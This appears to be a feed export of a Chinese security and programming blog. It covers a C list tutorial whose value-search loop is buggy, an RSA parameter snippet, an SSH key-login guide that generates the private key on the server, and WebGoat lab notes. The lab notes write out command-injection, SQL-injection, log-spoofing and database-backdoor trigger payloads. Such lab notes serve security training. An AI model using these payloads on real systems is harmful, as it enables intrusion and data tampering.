class="line">    &#125;</span><br><span class="line">    L.length--; <span class="comment">//线性表长度减1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//返回ture，删除操作成功。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="时间复杂度分析：-1"><a href="#时间复杂度分析：-1" class="headerlink" title="时间复杂度分析："></a>时间复杂度分析：</h4><p>删除操作的时间复杂度和插入操作的时间复杂度相同。</p><h3 id="0x0205-顺序表的查找-按位查找"><a href="#0x0205-顺序表的查找-按位查找" class="headerlink" title="0x0205 顺序表的查找(按位查找)"></a>0x0205 顺序表的查找(按位查找)</h3><h4 id="实现：-2"><a href="#实现：-2" class="headerlink" title="实现："></a>实现：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 查找第i个元素，返回给定值.</span></span><br><span class="line"><span class="comment"> * @param &#123;SqList&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @return &#123;int&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ElemType <span class="title function_">GetElemByIndex</span><span class="params">(SqList L, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> L.data[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="时间复杂度分析：-2"><a href="#时间复杂度分析：-2" class="headerlink" title="时间复杂度分析："></a>时间复杂度分析：</h4><p>直接返回值，时间复杂度 &#x3D; $O\left(1\right)$</p><h3 id="0x0206-顺序表的查找-按值查找"><a href="#0x0206-顺序表的查找-按值查找" class="headerlink" title="0x0206 顺序表的查找(按值查找)"></a>0x0206 顺序表的查找(按值查找)</h3><h4 id="实现：-3"><a href="#实现：-3" class="headerlink" title="实现："></a>实现：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 查找具有给定关键字值的元素</span></span><br><span class="line"><span class="comment"> * @param &#123;SqList&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElemByValue</span><span class="params">(SqList L, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (L.data[i] == e) &#123;</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>; <span class="comment">//数组下标为i的元素值等于e，返回其位序i+1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//退出了循环，说明查找失败</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ps：C语言中不能用<code>==</code>来直接比较两个结构体变量。</p></blockquote><h4 id="时间复杂度分析：-3"><a href="#时间复杂度分析：-3" class="headerlink" title="时间复杂度分析："></a>时间复杂度分析：</h4><p><strong>最好情况</strong>：目标元素在表头。<br>循环1次；最好时间复杂度 &#x3D; $O(1)$</p><p><strong>最坏情况</strong>：目标元素在表尾<br>循环n次；最坏时间复杂度 &#x3D; $O(n)$</p><p><strong>平均情况</strong>：假设目标元素出现在任何一个位置的概率相同，概率都是$p &#x3D; \cfrac 1n$<br>平均循环次数 &#x3D; $1\cdot\cfrac1n+2\cdot\cfrac1n+3\cdot\cfrac1n+……+n\cdot\cfrac1n &#x3D; [\frac{n(n+1)}2]·[\frac{1}{n}]&#x3D;\frac{n+1}2$<br>$\therefore$ 平均时间复杂度 &#x3D; $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python库分离RSA的n和e</title>
      <link href="/2022/01/12/2e9d266f63b6-q1jun/"/>
      <url>/2022/01/12/2e9d266f63b6-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Python分离RSA公钥的n和e参数"><a href="#Python分离RSA公钥的n和e参数" class="headerlink" title="Python分离RSA公钥的n和e参数"></a>Python分离RSA公钥的n和e参数</h1><p>直接打开公钥文件通过<code>RSA.importKey(key).n</code>和 <code>RSA.importKey(key).e</code>进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">pub = <span class="built_in">open</span>(<span class="string">r&quot;~/key.pub&quot;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">n = RSA.importKey(pub).n</span><br><span class="line">e = RSA.importKey(pub).e</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于RSA的非对称加密算法加密SSH远程管理</title>
      <link href="/2021/12/29/76799cf501fc-q1jun/"/>
      <url>/2021/12/29/76799cf501fc-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="基于RSA的非对称加密算法加密SSH远程管理"><a href="#基于RSA的非对称加密算法加密SSH远程管理" class="headerlink" title="基于RSA的非对称加密算法加密SSH远程管理"></a>基于RSA的非对称加密算法加密SSH远程管理</h1><h2 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h2><p>一般的密码方式登录，容易有密码被暴力破解的问题。所以，一般我们会将 SSH 的端口设置为默认的 22 以外的端口，或者禁用 root 账户登录。其实，有一个更好的办法来保证安全，而且让你可以放心地用 root 账户从远程登录——那就是通过密钥方式登录。</p><p>密钥形式登录的原理是：利用密钥生成器制作一对密钥——一只公钥和一只私钥。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。这样一来，没有私钥，任何人都无法通过 SSH 暴力破解你的密码来远程登录到系统。此外，如果将公钥复制到其他账户甚至主机，利用私钥也可以登录。</p><p>下面来讲解如何在 Linux 服务器上制作密钥对，将公钥添加给账户，设置 SSH，最后通过客户端登录。</p><h2 id="0x02-制作密钥对"><a href="#0x02-制作密钥对" class="headerlink" title="0x02 制作密钥对"></a>0x02 制作密钥对</h2><p>首先在服务器上制作密钥对。首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@q1jun ~]<span class="comment"># ssh-keygen</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa):<span class="comment">#这里直接回车，使用默认地址 </span></span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):<span class="comment">#使用密钥锁码，也可以回车留空</span></span><br><span class="line">Enter same passphrase again:<span class="comment">#确认密钥锁码</span></span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /root/.ssh/id_rsa.<span class="comment">#私钥</span></span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /root/.ssh/id_rsa.pub.<span class="comment">#公钥</span></span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:A86JqHd+I7WL4MKmSN3+ImhYOSh0C9BmLcQW/v1qZsE root@q1jun</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">| +oo             |</span></span><br><span class="line"><span class="string">|..B .            |</span></span><br><span class="line"><span class="string">|.+..  .          |</span></span><br><span class="line"><span class="string">| o + = o         |</span></span><br><span class="line"><span class="string">|..+.+.= S        |</span></span><br><span class="line"><span class="string">|o.=.. E. .       |</span></span><br><span class="line"><span class="string">|=o+o.o o.        |</span></span><br><span class="line"><span class="string">|=B =ooB.         |</span></span><br><span class="line"><span class="string">|*.. +B=+         |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><blockquote><p>密钥锁码在使用私钥时必须输入，这样就可以保护私钥不被盗用。当然，也可以留空，实现无密码登录。</p></blockquote><blockquote><p>现在，在 root 用户的家目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。id_rsa 为私钥，id_rsa.pub 为公钥。</p></blockquote><h2 id="0x03-在服务器上安装公钥"><a href="#0x03-在服务器上安装公钥" class="headerlink" title="0x03 在服务器上安装公钥"></a>0x03 在服务器上安装公钥</h2><p>将生成的公钥安装到服务器中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入安装密钥的目录</span></span><br><span class="line">[root@q1jun ~]<span class="comment"># cd .ssh/ </span></span><br><span class="line">[root@q1jun .ssh]<span class="comment"># ll</span></span><br><span class="line">总用量 12</span><br><span class="line">-rw------- 1 root root    0 11月 21 11:40 authorized_keys</span><br><span class="line">-rw------- 1 root root 2635 1月  24 11:05 id_rsa</span><br><span class="line">-rw-r--r-- 1 root root  564 1月  24 11:05 id_rsa.pub</span><br><span class="line">-rw-r--r-- 1 root root  175 1月  10 22:16 known_hosts</span><br><span class="line"><span class="comment">#查看公钥</span></span><br><span class="line">[root@q1jun .ssh]<span class="comment"># cat id_rsa.pub</span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCscE1/PJL6/vB5+8FD/duxETJgUsirUzJr1n448IrS4tEbRuTgDuNMdPTp3qZ/tIL+c5/1GyOnpeWEvSCbC2hMAAI5FBSfbhxNlF3JkgUJIeE64EaUHmQhuFVNhRLnFySox96RxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxXhlvmhevCmfC2f96G6ZUfcUv8wNudCEKTDIdDrZSOzg9N9l7l/lenRVM878vhEplMdqYEXKZF77UM9B6zBl8dLksBW7+Jt6EwUGN96/7HSpCKHlLIn4sDPVBaFrX+R0XnhCvbLN6yWIxY56khkHHd+M2W1C/8vmG4wZ7/Q95xOhqcOwDRmRoFU= root@q1jun</span><br><span class="line"><span class="comment">#安装公钥</span></span><br><span class="line">[root@q1jun .ssh]<span class="comment"># cat id_rsa.pub &gt;&gt; authorized_keys</span></span><br><span class="line"><span class="comment">#为了确保连接成功，请保证以下文件权限正确，在当前文件夹输入以下指令</span></span><br><span class="line">[root@q1jun .ssh]<span class="comment"># chmod 600 authorized_keys</span></span><br><span class="line">[root@q1jun .ssh]<span class="comment"># chmod 700 ~/.ssh/</span></span><br></pre></td></tr></table></figure><h2 id="0x04-设置SSH，打开密钥登入功能"><a href="#0x04-设置SSH，打开密钥登入功能" class="headerlink" title="0x04 设置SSH，打开密钥登入功能"></a>0x04 设置SSH，打开密钥登入功能</h2><p>编辑<code>/etc/ssh/sshd_config</code>文件，修改以下设置:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication <span class="built_in">yes</span></span><br><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>另外，请留意 root 用户能否通过 SSH 登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>当你完成全部设置，并以密钥方式登录成功后，再禁用密码登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure><p>重启SSH服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@q1jun ssh]<span class="comment"># systemctl restart sshd</span></span><br></pre></td></tr></table></figure><h2 id="0x05-将私钥下载到客户端"><a href="#0x05-将私钥下载到客户端" class="headerlink" title="0x05 将私钥下载到客户端"></a>0x05 将私钥下载到客户端</h2><p>这里将介绍四种在服务器与本地之间传输文件的方式，本人倾向于使用前两种即<code>sftp</code>和<code>scp</code>，其他两种不做演示。</p><h3 id="0x0501-文件传输：sftp"><a href="#0x0501-文件传输：sftp" class="headerlink" title="0x0501 文件传输：sftp"></a>0x0501 文件传输：sftp</h3><p>可以通过<code>sftp</code>将服务器的<code>id_rsa</code>私钥下载到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ sftp root@120.27.131.99</span><br><span class="line">root@120.27.131.99<span class="string">&#x27;s password: #输入服务器密码</span></span><br><span class="line"><span class="string">Connected to 120.27.131.99.</span></span><br><span class="line"><span class="string">sftp&gt; get /root/.ssh/id_rsa</span></span><br><span class="line"><span class="string">Fetching /root/.ssh/id_rsa to id_rsa</span></span><br><span class="line"><span class="string">/root/.ssh/id_rsa                             100% 2635    44.4KB/s   00:00</span></span><br><span class="line"><span class="string">#退出，或者按CTRL+c（Mac: control+c）</span></span><br><span class="line"><span class="string">sftp&gt; exit</span></span><br></pre></td></tr></table></figure><p>Secure Ftp 是一个基于SSH安全协议的文件传输管理工具。由于它是基于SSH的，会在传输过程中对用户的密码、数据等敏感信息进行加密，因此可以有效的防止用户信息在传输的过程中被窃取，比FTP有更高的安全性。在功能方面与FTP很类似，不仅可以传输文件数据，而且可以进行远程的文件管理（如建立，删除，查看文件列表等操作）。Sftp与ftp虽然只有一字之差，但基于的传输协议却是不同的。因此不能用sftp client去连接ftp server 也不能用 ftp client 去连接 sftp server。</p><p>建立连接：<code>sftp user@host</code></p><p>从本地上传文件：<code>put localpath</code></p><p>下载文件：<code>get remotepath</code></p><p>与远程相对应的本地操作，只需要在命令前加上”l” 即可，方便好记。</p><p>例如：<code>lcd lpwd lmkdir</code></p><h3 id="0x0502-文件传输：scp"><a href="#0x0502-文件传输：scp" class="headerlink" title="0x0502 文件传输：scp"></a>0x0502 文件传输：scp</h3><p>个人还是比较喜欢使用<code>scp</code>来远程传输文件的，通过<code>scp</code>将服务器的<code>id_rsa</code>私钥下载到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ scp root@120.27.131.99:/root/.ssh/id_rsa ~/</span><br><span class="line">root@120.27.131.99<span class="string">&#x27;s password:#输入服务器密码</span></span><br><span class="line"><span class="string">id_rsa                                 100% 2635    74.4KB/s   00:00</span></span><br></pre></td></tr></table></figure><p>SCP ：secure copy (remote file copy program) 也是一个基于SSH安全协议的文件传输命令。与sftp不同的是，它只提供主机间的文件传输功能，没有文件管理的功能。</p><p>复制<code>local_file</code> 到远程目录<code>remote_folder</code>下</p><p><code>scp local_file remote_user@host:remote_folder</code></p><p>复制<code>local_folder</code> 到远程<code>remote_folder</code>（需要加参数 -r 递归）</p><p><code>scp –r local_folder remote_user@host:remote_folder</code></p><p>以上命令反过来写就是远程复制到本地</p><h2 id="0x0503-文件传输：sz-x2F-rz"><a href="#0x0503-文件传输：sz-x2F-rz" class="headerlink" title="0x0503 文件传输：sz&#x2F;rz"></a>0x0503 文件传输：sz&#x2F;rz</h2><p>sz&#x2F;rz 是基于ZModem传输协议的命令。对传输的数据会进行核查，并且有很好的传输性能。使用起来更是非常方便，但前提是window端需要有能够支持ZModem的telnet或者SSH客户端，例如secureCRT。</p><p>首先需要在secureCRT中可以配置相关的本地下载和上传目录，然后用rz、sz命令即可方便的传输文件数据。</p><p>下载数据到本地下载目录：sz filename1 filename2 …</p><p>上传数据到远程：执行rz –be 命令，客户端会弹出上传窗口，用户自行选择(可多选)要上传的文件即可。</p><h2 id="0x0504-文件传输：rcp"><a href="#0x0504-文件传输：rcp" class="headerlink" title="0x0504 文件传输：rcp"></a>0x0504 文件传输：rcp</h2><p>rcp不是一种安全的的传输文件的方式，rcp通过rsh（rsh见下面）来执行远程命令，要使用rcp必须经过一些配置，现在rcp已经被scp取代了，常用scp来进行文件传输。要使用rcp，需要具备以下条件：</p><p>（1）如果系统中有<code>/etc/hosts </code>文件，应确保该文件包含要与之进行通信的远程主机信息：internet_address official_name alias。例如：1．186．10.*** blade1.ibm.com.cnblade</p><p>（2）<code>.rhosts</code> 文件：.rhosts 文件位于远程系统的根目录下，其中包含本地系统的名称和本地登录名。例如，远程系统的 .rhosts 文件中的项可能是：blade1 root；其中，blade1 是本地系统的名称，root 是本地登录名。这样，blade1 上的 root 即可在包含 .rhosts 文件的远程系统中来回复制文件。</p><p>配置过程：</p><p>（1） 在双方root用户根目录下建立.rhosts文件,并将双方的hostname加进去.在此之前应在双方的 &#x2F;etc&#x2F;hosts文件中加入对方的IP和hostname</p><p>（2） 把rsh服务启动起来,redhat默认是不启动的。方法：用执行<code>ntsysv</code>命令，在rsh选项前用空格键选中,确定退出。然后执行：<code>service xinetd restart</code>即可。</p><p>（3） 到<code>/etc/pam.d/</code>目录下,把rsh文件中的<code>auth required /lib/security/pam_securetty.so</code>一行用“#”注释掉即可。（只有注释掉这一行，才能用root用户登录）</p><p>命令使用：</p><p><code>rcp [options] [[user@]host1:]file1 ...[[user@]host2:]file2</code></p><p>options:　 </p><p>-r 递归地把源目录中的所有内容拷贝到目的目录中。</p><p>-p 试图保留源文件的修改时间和模式，忽略umask。</p><h2 id="0x06-通过RSA私钥登入SSH"><a href="#0x06-通过RSA私钥登入SSH" class="headerlink" title="0x06 通过RSA私钥登入SSH"></a>0x06 通过RSA私钥登入SSH</h2><p>在此之前确认已经从远程服务器中下载了<code>id_rsa</code>私钥到本地电脑中</p><blockquote><p>我的<code>id_rsa</code>存放的目录为&#x2F;Users&#x2F;q1jun&#x2F;id_rsa (~&#x2F;id_ras)</p></blockquote><p>通过<code>ssh</code>的 <code>-i</code>参数指定私钥存放的位置，具体命令如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220124115749185.png" alt="image-20220124115749185"></p><p>如果设置了密钥锁码，中间还要输入第一步时设置的密钥锁码。</p><p><strong>如果是Windows系统：</strong></p><p>推荐使用xshell登录，学生版本可以免费使用，登录方式可以采用用户名和密码，以及Public Key等多种形式。</p><p>(这里就不演示了，傻瓜操作)</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebGoat 网安攻击模拟训练笔记</title>
      <link href="/2021/12/08/89d9a84fca63-q1jun/"/>
      <url>/2021/12/08/89d9a84fca63-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="WebGoat-网安攻击模拟训练笔记"><a href="#WebGoat-网安攻击模拟训练笔记" class="headerlink" title="WebGoat 网安攻击模拟训练笔记"></a>WebGoat 网安攻击模拟训练笔记</h1><h2 id="1-SQL语句注入"><a href="#1-SQL语句注入" class="headerlink" title="1 SQL语句注入"></a>1 SQL语句注入</h2><h3 id="1-1-命令注入—Command-Injection"><a href="#1-1-命令注入—Command-Injection" class="headerlink" title="1.1  命令注入—Command Injection"></a>1.1  命令注入—Command Injection</h3><h4 id="1-1-1-操作说明"><a href="#1-1-1-操作说明" class="headerlink" title="1.1.1 操作说明"></a>1.1.1 操作说明</h4><p>右键左边选择框的组建，点击检查，在<code>&lt;option&gt;</code>标签中末尾添加 <code>&amp; ifconfig</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image001.png" alt="clip_image001"></p><p>然后点击 View 按钮执行，下方显示 <code>ifconfig</code>(Windows下为<code>ipconfig</code>)命令的输出结果</p><p>​    <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image002.png" alt="clip_image002"></p><h4 id="1-1-2-结果截图"><a href="#1-1-2-结果截图" class="headerlink" title="1.1.2 结果截图"></a>1.1.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image003.png" alt="clip_image003"></p><h3 id="1-2-数字型SQL注入—Numeric-SQL-Injection"><a href="#1-2-数字型SQL注入—Numeric-SQL-Injection" class="headerlink" title="1.2 数字型SQL注入—Numeric SQL Injection"></a>1.2 数字型SQL注入—Numeric SQL Injection</h3><h4 id="1-2-1-操作说明"><a href="#1-2-1-操作说明" class="headerlink" title="1.2.1 操作说明"></a>1.2.1 操作说明</h4><p>右键选择框组建，点击检查，修改<option>中的内容为<code>100 or 1=1</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image004.png" alt="clip_image004"></p><p>修改完成选择对应的内容，然后点击<code> Go！</code> 按钮执行</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image005.png" alt="clip_image005"></p><h4 id="1-2-2-结果截图"><a href="#1-2-2-结果截图" class="headerlink" title="1.2.2 结果截图"></a>1.2.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image006.png" alt="clip_image006"></p><h3 id="1-3-日志欺骗—Log-Spoofing"><a href="#1-3-日志欺骗—Log-Spoofing" class="headerlink" title="1.3 日志欺骗—Log Spoofing"></a>1.3 日志欺骗—Log Spoofing</h3><h4 id="1-3-1-操作说明"><a href="#1-3-1-操作说明" class="headerlink" title="1.3.1 操作说明"></a>1.3.1 操作说明</h4><p>通过日志的换行符（%0d%0a）来欺骗管理员，输入：<code>q1jun%0d%0aLogin Succeeded for username: admin</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image007.png" alt="clip_image007"></p><p>点击login后：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image008.png" alt="clip_image008"></p><h4 id="1-3-2-结果截图"><a href="#1-3-2-结果截图" class="headerlink" title="1.3.2 结果截图"></a>1.3.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image009.png" alt="clip_image009"></p><h3 id="1-4-SQL字符串注入—String-SQL-Injection"><a href="#1-4-SQL字符串注入—String-SQL-Injection" class="headerlink" title="1.4 SQL字符串注入—String SQL Injection"></a>1.4 SQL字符串注入—String SQL Injection</h3><h4 id="1-4-1-操作说明"><a href="#1-4-1-操作说明" class="headerlink" title="1.4.1 操作说明"></a>1.4.1 操作说明</h4><p>在输入框中输入 Smith &#96; or 1&#x3D;1 – 使得查询SQL语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Smith&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image010.png" alt="clip_image010"></p><p>最后的 <code>--</code>为SQL语句的注释符，保证语句的正确，然后点击<code>Go！</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image011.png" alt="clip_image011"></p><h4 id="1-4-2-结果截图"><a href="#1-4-2-结果截图" class="headerlink" title="1.4.2 结果截图"></a>1.4.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image012.png" alt="clip_image012"></p><h3 id="1-5-数据库后门—Database-Backdoors"><a href="#1-5-数据库后门—Database-Backdoors" class="headerlink" title="1.5 数据库后门—Database Backdoors"></a>1.5 数据库后门—Database Backdoors</h3><h4 id="1-5-1-操作说明"><a href="#1-5-1-操作说明" class="headerlink" title="1.5.1 操作说明"></a>1.5.1 操作说明</h4><p><strong>Stage1:</strong></p><p>输入**<code>101; update employee set salary=100000 where userid = 101;</code>**</p><p>使其组成以下两条完整的SQL语句，第二条修改薪资为10w (不嫌多,嘿嘿）。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> userid, <span class="keyword">password</span>, ssn, salary, email <span class="keyword">from</span> employee <span class="keyword">where</span> userid=<span class="number">101</span>; </span><br><span class="line"> <span class="keyword">update</span> employee <span class="keyword">set</span> salary=<span class="number">100000</span> <span class="keyword">where</span> userid = <span class="number">101</span>;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image013.png" alt="clip_image013"></p><p><strong>Stage2:</strong></p><p>根据提示，创建一个数据库触发器：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> myBackDoor BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> employee <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> <span class="keyword">BEGIN</span> <span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> email<span class="operator">=</span><span class="string">&#x27;john@hackme.com&#x27;</span><span class="keyword">WHERE</span> userid <span class="operator">=</span> NEW.userid</span><br></pre></td></tr></table></figure><p>注入代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">101</span>;<span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> myBackDoor BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> employee <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> <span class="keyword">BEGIN</span> <span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> email<span class="operator">=</span><span class="string">&#x27;john@hackme.com&#x27;</span><span class="keyword">WHERE</span> userid <span class="operator">=</span> NEW.userid</span><br></pre></td></tr></table></figure><p>注入成功：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image014.png" alt="clip_image014"></p><h4 id="1-5-2-结果截图"><a href="#1-5-2-结果截图" class="headerlink" title="1.5.2 结果截图"></a>1.5.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image015.png" alt="clip_image015"></p><h2 id="2-跨站脚本XSS攻击"><a href="#2-跨站脚本XSS攻击" class="headerlink" title="2 跨站脚本XSS攻击"></a>2 跨站脚本XSS攻击</h2><h3 id="2-1-钓鱼攻击—Phishing-with-XSS"><a href="#2-1-钓鱼攻击—Phishing-with-XSS" class="headerlink" title="2.1 钓鱼攻击—Phishing with XSS"></a>2.1 钓鱼攻击—Phishing with XSS</h3><h4 id="2-1-1-操作说明"><a href="#2-1-1-操作说明" class="headerlink" title="2.1.1 操作说明"></a>2.1.1 操作说明</h4><p>构建XSS代码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image016.png" alt="clip_image016"></p><p>放入Search中，点击搜索：</p><p><img 